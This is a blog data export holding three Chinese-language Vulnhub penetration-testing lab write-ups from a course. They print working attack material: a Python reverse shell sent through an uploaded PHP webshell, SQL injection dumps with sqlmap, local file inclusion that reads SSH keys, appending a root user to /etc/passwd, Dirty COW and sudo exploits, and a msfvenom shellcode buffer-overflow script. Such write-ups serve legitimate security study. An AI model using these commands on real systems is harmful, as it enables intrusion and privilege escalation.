{"meta":{"title":"铃的杂货铺","subtitle":"二阶铃图","description":"喜欢夏天的无名之辈","author":"可弟WZ铃号机","url":"http://blog.kekwy.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2022-07-30T02:45:25.000Z","updated":"2022-07-30T02:57:34.055Z","comments":true,"path":"404.html","permalink":"http://blog.kekwy.com/404.html","excerpt":"","text":"404"},{"title":"文章合集","date":"2022-07-31T13:04:10.582Z","updated":"2022-07-31T13:04:10.582Z","comments":true,"path":"categories/index.html","permalink":"http://blog.kekwy.com/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-07-31T13:41:20.153Z","updated":"2022-07-31T11:25:31.267Z","comments":false,"path":"about/index.html","permalink":"http://blog.kekwy.com/about/index.html","excerpt":"","text":"喜欢夏天的社畜程序猿，南京大学计算机系本科生，我的世界建筑玩家。 B站: 可弟WZ柒号机 知乎: 可弟岭冬 GitHub: Kekwy 近期计划： 文章：《从继承开始的Java应用笔记》 视频：《我的世界·水星生存指南》 项目：一个3D联机小游戏"},{"title":"大伙儿","date":"2022-07-30T15:17:01.000Z","updated":"2022-07-31T13:04:48.714Z","comments":false,"path":"friends/index.html","permalink":"http://blog.kekwy.com/friends/index.html","excerpt":"","text":""},{"title":"留言板","date":"2022-07-31T13:03:54.437Z","updated":"2022-07-31T13:03:54.437Z","comments":true,"path":"comments/index.html","permalink":"http://blog.kekwy.com/comments/index.html","excerpt":"","text":"也可以是聊天室（"},{"title":"记录生活","date":"2022-07-31T11:26:11.263Z","updated":"2022-07-31T11:26:11.263Z","comments":false,"path":"recordings/index.html","permalink":"http://blog.kekwy.com/recordings/index.html","excerpt":"","text":"2022七月7.31 网站功能初步竣工，将在使用过程中调整或完善。"}],"posts":[{"title":"【渗透测试】第九周 vulnhub-DoubleTrouble:1","slug":"vulnhub-doubletrouble","date":"2022-11-15T16:46:45.000Z","updated":"2022-11-15T16:56:05.796Z","comments":true,"path":"vulnhub-doubletrouble/","link":"","permalink":"http://blog.kekwy.com/vulnhub-doubletrouble/","excerpt":"","text":"网络攻防实战 第九次实验 邮箱：https://www.vulnhub.com/entry/doubletrouble-1,743/ 2022年11月15日 一、实验目的本次的靶机比较特别，在获取第一个靶机的 root 权限后会在 root 主目录下发下另一个靶机的 .ova 文件，我们还需要将其下载到宿主机，继续尝试渗透。最终取得两个靶机的 root 权限以及第二个靶机上的两个 flag。 我们将使用到以下攻击手段： 主机发现； 端口扫描； 隐藏路径爆破； 隐写数据破解； 文件上传漏洞； 一句话木马脚本； 反弹 shell； awk 提权； sql基于时间的盲注（使用sqlmap）； 脏牛漏洞提权。 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.14、10.0.2.16 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12sudo arp-scan -I eth0 -lsudo nmap -p- 10.0.2.14 -A 访问80端口发现是一个登录界面，查看源码也并没有直接可利用的信息： 尝试直接输入单引号触发报错寻找注入点，也没有结果。 （使用 BurpSuite 拦截请求，发现我们输入的单引号在发送前被进行了转义，但重新修改为单引号后发送，同样没有收到报错信息） 0x01. 隐藏路径爆破 首先想到查找隐藏路径： 1dirsearch -u http://10.0.2.14 找到了隐藏路径 /secret/ ，根据此前实验的经验，我们第一时间查看其内容。 访问上述目录，发现只包含一张图片： 既然其处于 /secret/ 目录下，猜测其中包含隐写入的信息。 将其保存至 kali，使用 stegseek 工具进行破解： 安装：$ sudo apt install stegseek 仓库：https://github.com/RickdeJager/stegseek 1stegseek doubletrouble.jpg rockyou.txt 其中 rockyou.txt 字典可以通过 locate 命令在 kali 上找到。 生成了输出文件 doubletrouble.jpg.out，查看破解结果，发现疑似此前网站主页的登录邮箱和密码。 12otisrush@localhost.comotis666 尝试登录，成功跳转至下级界面： 0x02. 文件上传漏洞 浏览各个界面，优先关注文件上传点： 首先发现可以通过网页右上角进入用户的 My Details 界面，其中可以进行用户的头像的上传，但是先尝试上传一个普通图片后，发现该功能存在 bug，上传失败。 返回主页后在左侧菜单栏访问目录 Tools-&gt;Import Tasks from XLS file ，发现第二个文件上传点，但是上传之后，同样触发错误： 最终在左侧菜单栏 Configuration-&gt;General-&gt;General 界面发现有效的文件上传点。 浏览 Configuration-&gt;General-&gt;General 界面，发现可以进行文件上传，推测可能是用于设置该网站应用的 logo： 选择任意图片尝试上传后，发现当前页面左上角发生变化，变为了我们刚才选择的图片： 说明此处的文件上传功能确实有效可用。 尝试直接上传我们祖传的一句话木马文件，发现上传失败，推测需要进行文件类型检测的绕过。 在此尝试上传，并使用 BurpSuite 截获我们的请求，修改我们所上传文件的信息： 使用此前实验中用过的方法，在文件内容开头加入 GIF89a 进行文件内容欺诈。 发现左上角的内容发生变化，变为一张显示错误的图片。右键选择新建标签页打开图片，获取图片对应文件的 url： 显然我们的一句话木马文件上传成功，测试一下： 到此为止，我们就可以和之前一样，通过一句话木马执行反弹 shell 脚本： 12http://10.0.2.14/uploads/script.php?cmd=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.15&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 成功获取反弹 shell，使用以下指令进行提升： 1python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 0x03. 利用 awk 提权 查看当前用户不使用密码就可以通过 sudo 执行的命令： 1sudo -l 发现可以不使用密码通过 sudo 执行 awk 命令。 前往提权指令汇总网站 GTFOBins 查找 awk 命令： 选择 Shell 查看 Shell 提权的命令： 1sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27; 在反弹 shell 中输入上述指令，完成提权。 切换至靶机的 root 用户主目录，发现还存在一个靶机的 .ova 文件： 使用 nc 命令将其下载到 kali，再通过 virtualBox 的文件传输功能将其传送至宿主机。 12nc -n 10.0.2.15 1234 &lt; doubletrouble.ova # 靶机nc -lp 1234 &gt; doubletrouble.ova # kali 或在靶机上开启 web 应用，然后在上对目标文件进行下载【本次使用】 0x04. SQL 盲注 对该靶机进行同样的主机发现以及端口扫描等常规操作之后，发现开放了 80 端口，浏览器访问，发现又是一个登录界面： 常规的 SQL 注入探测未发现注入点，考虑 SQL 盲注。 截获我们在该界面进行登录时的请求： 修改如下： 根据 SQL 语法，我们可以判定，如果该报文的响应在发送十秒之后到来。则说明此处存在注入点。考虑通过 sqlmap 实现盲注的自动化，并导出靶机数据库。 将该请求数据包的内容拷贝至本地的文件 sqlinject 中： 使用 sqlmap 从该文件中加载请求，并进行探测： 1sqlmap -r sqlinject -p uname,psw # 指定测试参数为uname, psw sqlmap 会自动尝试各种注入方式，根据输入结果可知 sqlmap 成功通过基于时间的盲注获取靶机数据库的信息： 查看当前用户可见的数据库： 1sqlmap -r sqlinject -p uname,psw --dbs 由于是基于时间的盲注，观察结果的输出过程可以发现，每隔一段时间确认一个字符。 查看数据库 doubletrouble 中的表： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble --tables 查看表 users 的列： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users --columns 查看表中 username 与 password 两项的内容： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users -C username,password --dump 发现存在两个用户。 将其输入之前的登录界面，发现两个用户都无法登录。想到靶机开放了22端口，尝试使用上述两个用户的信息通过 SSH 登入靶机。发现用户 clapton 登入成功： 0x05. “脏牛”漏洞提权 脏牛漏洞：又叫Dirty COW（copy-on-write），存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。 漏洞范围：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复） 发现当前目录有存在文件 user.txt，查看内容，获取第一个 Flag： Flag1: 6CEA7A737C7C651F6DA7669109B5FB52 查看内核版本 uname -a： 发现该版本存在脏牛漏洞。 搜索其利用代码： 仓库：https://github.com/gbonacini/CVE-2016-5195 在 kali 创建 dcow.cpp 写入漏洞利用代码，并通过 web 服务将其上传至靶机： 12sudo python3 -m http.server 80 # kaliwget http://10.0.2.15/dcow.cpp # 靶机 查看仓库中的 makefile 文件，发现编译指令： 1g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil 在靶机上编译运行，发现该程序将靶机上 root 用户的密码强制更改为了 dirtyCowFun： 使用 su root，输入该密码切换至 root 身份： 切换至 root 用户的主目录，查看其目录下的文件，发现第二个 Flag： Flag2: 1B8EEA89EA92CECB931E3CC25AA8DE21 三、实验结果 root： Flag1: 6CEA7A737C7C651F6DA7669109B5FB52 Flag2: 1B8EEA89EA92CECB931E3CC25AA8DE21 四、总结 访问 80 端口发现一个登录界面。爆破隐藏路径，发现 /secret/ 路径。在其目录下发现一个图片，使用 stegseek 破解其中数据，猜测是用于登录主页的邮箱和密码，使用其进行登录，发现登录成功。 浏览各个界面寻找文件上传点，上传一句话木马文件，通过该文件注入反弹 shell 脚本生成反弹 shell。 使用 awk 提权，发现另一个靶机的 .ova 文件，下载至 kali 后移动到宿主机，导入 Virual Box 后启动。 浏览器访问 80 端口，发现登录界面。通过 sqlmap 进行 sql 注入，获取用户名和密码，通过 SSH 登入。 查看靶机内核，发现存在脏牛漏洞，搜索利用代码，上传至靶机编译运行，发现强制修改了 root 用户的密码，使用该密码即可至 root 身份，提权成功。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第八周 vulnhub-EvilBox:One","slug":"vulnhub-EvilBoxOne","date":"2022-11-08T07:41:56.000Z","updated":"2022-11-10T07:51:45.918Z","comments":true,"path":"vulnhub-EvilBoxOne/","link":"","permalink":"http://blog.kekwy.com/vulnhub-EvilBoxOne/","excerpt":"","text":"网络攻防实战 第八次实验 邮箱：&#x6b;&#101;&#101;&#107;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#x6d; 2022年11月8日 靶机连接：https://vulnhub.com/entry/evilbox-one,736/ 一、实验目的取得目标靶机的 root 权限并获得两个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 隐藏路径爆破 参数名爆破 文件包含漏洞的发现以及利用 SSH 登入 私钥密码爆破 特定权限文件的发现 添加自定义用户记录 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.12 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.12 -A 访问80端口发现是一个 Apache2 Debian 的默认页面，没有对渗透有帮助的信息： 0x01. 隐藏路径爆破 首先使用 dirsearch 进行路径爆破： 找到了隐藏路径 /secret/ 和隐藏文件 robots.txt。 分别访问均没有获得有效信息。 ps：robots.txt 对 /secret/ 做进一步路径爆破： 直接使用 dirsearch 由于字典限制无法找到更多信息，此处使用 gobuster 进行爆破。 安装：apt install gobuster 安装字典：apt install seclists 渗透测试要尝试掌握多种工具 使用指定字典进行路径爆破： 1$ gobuster dir -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp 除了主页文件之外，还发现一个 PHP 文件 evil.php。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 GET 方法提供一个参数（即在 url 后添加某个参数）。 0x02. 参数名爆破使用 ffuf 工具对该参数键值对（参数名和对应的值）进行爆破： 首先期望存在命令注入漏洞： 1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://10.0.2.12/secret/evil.php?PARAM=ls -fs 0 选择字典文件 burp-parameter-names.txt 作为参数名； 命令 ls 作为参数值。 进行爆破后，为获得有效结果，爆破失败。 期望存在文件包含漏洞： 1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0 选择字典文件 burp-parameter-names.txt 作为参数名； 已知存在的主页文件的路径作为参数值。 爆破成功，结果显示需要提供的参数名为 command 。 查看靶机文件验证漏洞存在： 1http://10.0.2.12/secret/evil.php?command=/etc/passwd 查看返回页面源码： 读取了靶机上的 /etc/passwd 文件，确认存在文件包含漏洞。 0x03. SSH 私钥密码爆破 通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 mowree 用户拥有登录权限，其主目录为 /home/mowree.尝试获取其被允许的 SSH 登录方式： 1$ ssh mowree@10.0.2.12 -v # debug模式 发现除了允许输入对应密码登录外还可以使用密钥登录。 通过文件包含漏洞查看靶机上该用户的私钥： 1http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa 将其保存在文件 id_rsa 中。 使用指定私钥登录靶机： 1# ssh mowree@10.0.2.12 -i id_rsa 发现需要输入私钥的密码： 考虑对其进行爆破。 如果出现报错： 这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。 修改权限为7000即可： 1$ chmod 7000 id_rsa 参考：https://blog.csdn.net/Figure_hb/article/details/90754146 将密钥文件转换为 john 可用的 hash 文件： 1# /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash 使用 john 进行爆破： 1$ john id_rsa.hash --wordlist=rockyou.txt 该字典文件可通过在 kali 上使用 locate 指令搜索得到 成功获取私钥密码 unicorn。 成功登入靶机： 0x04. 信息收集 查看当前目录下的文件，获取第一个 Flag： Flag1：56Rbp0soobpzWSVzKh9YOvzGLgtPZQ 当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件： 1$ find / -perm -o+w -maxdepth 3 -print | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt find指令的使用：https://blog.csdn.net/m0_46674735/article/details/112390027 使用find命令按权限查找文件：https://www.iplayio.cn/post/596968725 -o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）； -maxdepth：从根目录开始搜索的最大深度为3； -print：将输出结果写入标准输出文件； grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run： 忽略以上目录下的搜索结果； &gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。 查看搜索结果，发现 /etc/passwd 文件竟然可以被其他用户写入： 进一步验证： 1$ ls /etc/passwd -al 发现我们确实具有写权限。 设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。 0x05. 自定义 root 用户 首先需要在 kali 上对我们自定义的密码进行加密。使用工具 openssl： 1$ openssl passwd 这里我输入的明文密码为 test123。 使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录： 1test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash 将该记录追加在 /etc/passwd 文件中： 1$ echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd 切换到用户 test123： 1$ su test123 成功提权。 切换到 root 目录，发现第二个 Flag： Flag2：36QtXfdJWvdC0VavlPIApUbDlqTsBM 三、实验结果 Flag1：56Rbp0soobpzWSVzKh9YOvzGLgtPZQ Flag2：36QtXfdJWvdC0VavlPIApUbDlqTsBM root： 四、总结 根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破； 使用 dirsearch 爆破到存在 /secret/ 路径，但是继续爆破无果。换用 gobuster 进行路径爆破，最终找到一个 PHP 文件 evil.php； 直接访问返回空白页，推测其可能需要一个参数，使用 ffuf 进行参数名的爆破，最终发现存在文件包含漏洞； 通过文件包含漏洞查看文件 /etc/passwd，发现一个可以登录的用户 mowree。使用 ssh 尝试登录发现该用户还支持私钥认证登录； 通过文件包含漏洞获取靶机对应路径下的私钥，并使用 john 对私钥密码进行爆破； 成功登入靶机后，发现当前用户对 /etc/passwd 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录； 使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。 五、思路拓展 对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞） 也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 evil.php 读出： 1http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg== 通过 icyberchef 进行解码： 1234&lt;?php $filename = $_GET[&#x27;command&#x27;]; include($filename);?&gt; 成功获取到 evil.php 的源码。 尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本： 12http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz 尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第七周 vulnhub-Fawkes","slug":"vulnhub-Fawkes","date":"2022-11-02T05:21:10.000Z","updated":"2022-11-10T09:24:37.076Z","comments":true,"path":"vulnhub-Fawkes/","link":"","permalink":"http://blog.kekwy.com/vulnhub-Fawkes/","excerpt":"","text":"网络攻防实战 第七次实验 邮箱：&#107;&#101;&#x65;&#x6b;&#x6b;&#101;&#x77;&#121;&#64;&#113;&#113;&#46;&#x63;&#111;&#x6d; 2022年11月2日 靶机连接：https://vulnhub.com/entry/harrypotter-fawkes,686/ 一、实验目的取得目标靶机的 root 权限并获得三个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 FTP匿名登录 edb 调试程序 栈溢出攻击 tcpdump 流量分析 sudo 漏洞提权 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.11 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 123$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.11$ sudo nmap -p21,22,80,2222,9898 -sV 10.0.2.11 -A 发现两个比较特殊的端口： 21 - ftp 服务并允许匿名登录获取文件 server_hogwarts； 9898 - 一个自定义的服务。 访问80端口并查看网页源码，发现只有一张图片，并没有其他有价值的信息： 0x01. FTP 匿名登录 查看我们端口扫描获取的信息： 说明该 FTP 服务可以使用用户名 Anonymous 无密码登入并可以查看文件 server_hogwarts。 通过 FTP 登入靶机并使用 get 指令下载上述文件： 12$ ftp 10.0.2.11ftp&gt; get server_hogwarts 查看文件类型，发现是一个 ELF 可执行文件： 1$ file server_hogwarts 给予执行权限，尝试执行： 发现什么都没有输出，但是 shell 阻塞住了并没有退出，说明该程序确实启动了。 查看后台进程： 1$ ps -aux | grep server # 显示名字包含server的所有进程 发现该程序确实创建了后台进程。 查看该进程的连接信息： 1$ ss -pantu | grep server_hogwarts 发现该进程运行在9898端口上，联想到靶机9898端口上的自定义服务，推测该程序即为靶机9898端口上所运行的服务。 使用 nc 命令监听该端口： 发现我们可以进行输入，推测存在栈溢出攻击。 0x02. 栈溢出攻击 使用 checksec 工具查看该文件开启了哪些保护机制： 安装：$ apt install checksec 1$ file server_hogwarts STACK CANARY：在初始化堆栈时在栈底插入一个随机生成的 cookie，在函数返回前调用 __stack_chk_fail 检查 cookie 有没有发生变化，若发生变化则不返回，而直接终止程序。由于缓冲区溢出攻击时往往会覆盖掉 cookie 的值，故该保护机制开启时会导致常规的溢出攻击失效，程序会直接终止而不是跳转至攻击者注入的目标地址。 NX：开启时栈中数据没有执行权限，即攻击者不能通过缓冲区溢出注入攻击代码； PIE：编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定，使程序的内存布局难以预料。 参考：checksec NX、PIE 关闭，我们可以尝试注入反弹 shell 的代码并使其被执行，从而获取反弹 shell。 STACK CANARY 被开启了，意味着注入时我们也许要针对其进行某种绕过，先不管它。 将 kali 本机上的 ALSR 安全机制关闭，该技术会导致地址空间随机化，不便于调试： 1# echo 0 &gt; /proc/sys/kernel/randomize_va_space 使用 edb 对当前程序进行调试，探测注入点： 安装：$ apt install edb-debugger 1$ sudo edb 点击 File-&gt; Attach ： 选择目标进程： 点击运行： 使用 python 生成500个“A”，并在监听窗口进行输入： 1$ python -c &quot;print(500*&#x27;A&#x27;)&quot; 触发报错且看到“0x41414141”，查看此时 EIP 寄存器的值： 发现变成了 0x41414141，而 ‘0x41’ 为 ‘A’ 的十六进制编码，说明我们输入的字符成功覆盖了函数返回地址，导致程序发生了错误跳转。 “诶？不是说这个程序开启了 STACK CANARY 保护机制，会对栈溢出做检查吗？为什么直接注入就成了？” 重新执行上述操作，并重新监听9898端口。点击单步调试： 同样输入500个A， 回到 edb 继续追踪，直到触发错误，记录此时的指令地址： 发现在追踪的过程中没有调用 __stack_chk_fail 函数检查 cookie 的正确性。通过 objdump 查看其反汇编代码进一步确认，发现原来 __stack_chk_fail 只在一部分函数返回前被调用了，而在注入点所在的函数中未被调用，因此我们可以正常进行注入。 综上，Canary found 仅代表程序中存在检查机制，而不一定在所有的ret 语句前都做了检查。在进行渗透测试时应先尝试注入，不要被一些未验证的细节限制了思路。 使用 msf-pattern 工具进行溢出点在输入字符串中位置的探测： 1$ msf-pattern_create -l 500 # 生成长度为500的模式字符串 重新程序并重新开始调试，将生成的模式字符串作为输入： 提示我们此时 EIP 中的值为 0x64413764，即我们输入的字符串中编码为“\\x64\\x41\\x37\\x64”的字串进入了 EIP 中。查找该段编码对应的字符串在模式字符串中的偏移量： 1$ msf-pattern_offset -l 500 -q 64413764 也就是说从模式字符串中的第113个字符串开始造成了栈溢出。 使用 python 生成一段自定义字符串进行验证： 1$ python -c &quot;print(112*&#x27;A&#x27; + &#x27;BBBB&#x27; + 100*&#x27;C&#x27;)&quot; 将生成的字符串输入后，查看 EIP 和栈中的值： 发现第113、114、115、116个字符（“BBBB”）恰好进入 EIP，而其后的字符保留在栈中。 设想将反弹 shell 代码注入栈中，而使程序跳转到栈中执行（jmp esp），即可令靶机上的程序执行反弹 shell 代码生成反弹 shell。 寻找原程序中的 jmp esp 指令，打开 edb 的 Opcode Search： 选择一个可执行段，然后选择搜索 ESP -&gt; EIP： 找到 jmp esp 指令并记录其地址（0x08049d55）： 构造注入字符串： 1$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -b &quot;\\x00&quot; -f py LHOST：改为 kali 的 IP； LPORT：改为监听反弹 shell 的端口号； -b &quot;\\x00&quot;：过滤坏字符（’\\0’），避免输入提前终止。 编写注入脚本： 123456789101112131415161718import struct, socketbuf = b&quot;&quot;buf += b&quot;\\xd9\\xec\\xbe\\xe7\\x1d\\x4c\\x47\\xd9\\x74\\x24\\xf4\\x5f&quot;buf += b&quot;\\x29\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x08&quot;buf += b&quot;\\xe1\\xae\\xb2\\xe7\\xc1\\xd8\\xde\\x54\\xb5\\x75\\x4b\\x58&quot;buf += b&quot;\\xb0\\x9b\\x3b\\x3a\\x0f\\xdb\\xaf\\x9b\\x3f\\xe3\\x02\\x9b&quot;buf += b&quot;\\x09\\x65\\x64\\xf3\\x83\\x95\\x94\\x0c\\xfc\\x97\\x98\\x03&quot;buf += b&quot;\\xa0\\x1e\\x79\\x93\\x3e\\x71\\x2b\\x80\\x0d\\x72\\x42\\xc7&quot;buf += b&quot;\\xbf\\xf5\\x06\\x6f\\x2e\\xd9\\xd5\\x07\\xc6\\x0a\\x35\\xb5&quot;buf += b&quot;\\x7f\\xdc\\xaa\\x6b\\xd3\\x57\\xcd\\x3b\\xd8\\xaa\\x8e&quot;payload = 112 * b&#x27;A&#x27; + struct.pack(&#x27;I&#x27;,0x08049d55) + 32 * b&#x27;\\x90&#x27; + bufs=socket.socket()s.connect((&#x27;10.0.2.11&#x27;,9898))s.send((payload))s.close() 关于上述脚本，我们在栈溢出跳转地址和攻击代码之间加入了一长串空指令 nop（\\x90）。至于为什么一定要加上这一段，我们先看看运行注入代码时发生了什么。 在本地调试时，上述脚本中 connect 的 IP 参数要更改为 127.0.0.1 程序成功跳转到 jmp esp 指令时，观察栈中数据，发现从 08049d55 （我们注入的 jmp esp 指令地址）之后紧接着就是我们加入的32个 \\x90。 接着往下看，当程序运行到 fnstenv [esp - 0xc] 指令时，栈中数据发生了变化，部分空指令被新数据覆盖： 注入代码中存在指令修改了栈顶数据，若不加空指令，我们的注入代码本身就处于栈顶，则会在执行过程中将自身的代码覆盖掉。添加空指令之后，EIP 会沿着空指令一直增长到真正的注入代码，而 ESP 不变，使 EIP 与 ESP 拉开一定的距离，一定程度上保证注入在栈中的代码不会被修改。 故在注入时加入一段空指令可以提高程序稳定性，一般加入的空指令数为4的倍数。 监听 4444 端口，执行上述脚本，获取反弹 shell： 0x03. 信息收集 发现当前用户的主目录下存在隐藏文件： 查看该文件内容： HarrYp0tter@Hogwarts123 疑似某个密码，联想此前靶机上开放的 ssh 端口，尝试通过 ssh 登录靶机。 首先通过22端口登录，发现登录失败；转而通过2222端口登录，发现登录成功： 查看用户权限： 1$ sudo -l 发现当前用户可以不使用密码通过 sudo 执行所有命令。 使用 sudo -i 指令直接提权，并发现 root 账号主目录下存在两个文件： 查看当前环境 IP： 根据 lab2 的经验，我们进入的可能是一个 docker 容器而非靶机本身。 查看此前发现的两个文件： horcrux1.txt：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} note.txt： Hello Admin!! We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user. 第一个文件为我们发现的第一个 Flag，第二个文件为一些提示，提示我们需要监听靶机 FTP 服务的流量，即靶机21端口的流量。 0x04. tcpdump 流量分析 使用 tcpdump 命令监听靶机21端口： 1$ tcpdump -i eth0 port 21 等待片刻后发现输出了一些流量记录： 发现其握手信息中包含用户名和密码。 USER：neville PASS：bL!Bsg3k 尝试使用上述用户名和密码通过靶机的22端口登入靶机： 成功登录后，通过 IP 信息发现此时环境为真正的靶机。 查看当前路径下的文件，获取第二个 Flag： horcrux2.txt：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} 0x05. sudo 漏洞提权 查看内核与 sudo 版本信息： 上网搜索相关的漏洞信息，最终发现针对当前版本 sudo 的一个漏洞及其利用代码： CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) 利用代码：https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py 将此处 sudo 的路径更改为靶机上 sudo 的路径： 在 kali 上开启 web 应用，将该文件上传至靶机运行： 成功提权！ 前往靶机的 /root/ 路径，发现第三个 Flag： 三、实验结果 Flag1：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} Flag2：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} Flag3： root 权限： 四、总结 从端口服务信息中得知靶机 FTP 服务允许匿名登录，尝试匿名登录，通过 get 指令下载文件server_hogwarts，发现是一个可执行文件； 试运行该程序，推测该程序与靶机 9898 端口所运行服务的程序相同； 使用 edb 对该程序进行调试，发现栈溢出攻击注入点，并编写注入脚本，向靶机 9898 端口服务注入反弹 shell 代码； 成功获取反弹 shell，在当前用户主目录的隐藏文件中发现可用于 ssh 登录的密码； 使用 ssh 通过靶机 2222端口登录后，发现位于一个容器中，且当前用户可以直接使用 sudo -i 进行提权。在当前容器 root 用户的主目录中发现第一个 Flag； 使用 tcpdump 监听容器 21 端口的流量，发现 FTP 的握手过程包含了用户名和密码，猜测可以用来通过 ssh 登入靶机。尝试后成功通过22端口进入靶机； 在靶机当前用户的主目录下发现第二个 Flag； 查看发行版本以及 sudo 